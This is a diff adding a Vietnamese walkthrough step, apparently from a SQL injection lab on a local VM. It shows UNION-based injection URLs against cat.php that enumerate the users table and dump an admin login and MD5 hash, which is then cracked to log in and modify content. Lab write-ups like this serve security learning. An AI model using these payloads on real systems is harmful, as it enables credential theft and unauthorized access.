@@ -76,3 +76,19 @@
     | 31  | picture: categories                            |
     | 32  | picture: pictures                              |
     | 33  | picture: users                                 |
+
+- Nhưng ở đây, ta sẽ quan tâm tới table users. Đây sẽ là nơi chứa thông tin của các user trong database
+- Đầu tiên, ta cần biết số lượng cột và tên từng cột trong bảng users
+  ```php
+  http://192.168.216.129/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_name='users'
+  ```
+- Kết quả trả về gồm 3 cột với tên lần lượt là: id, login, password
+- Từ đây, ta có thể dễ dàng show ra thông tin toàn bộ users
+  ```php
+  http://192.168.216.129/cat.php?id=1 union select 1,concat(id,0x3a,login,0x3a,password),3,4 from users
+
+  Kết quả trả về: 1:admin:8efe310f9ab3efeae8d410a8e0166eb2
+  ```
+- Đây là thông tin về admin, giờ chúng ta thử đăng nhập. Nhưng không thành công, có thể suy đoán mật khẩu đã được mã hóa.
+- Ta sẽ thử giải nén mật khẩu. Và sau khi thử các cách giải mã: DES, 3DES, AES, SHA, MD5,.. thì password nhận được là P4ssw0rd.
+- Đến đây ta đã có thông tin username: admin, password: P4ssw0rd. Và bây giờ ta đã có thể đăng nhập thành công và tùy ý thêm và xóa các bức tranh.
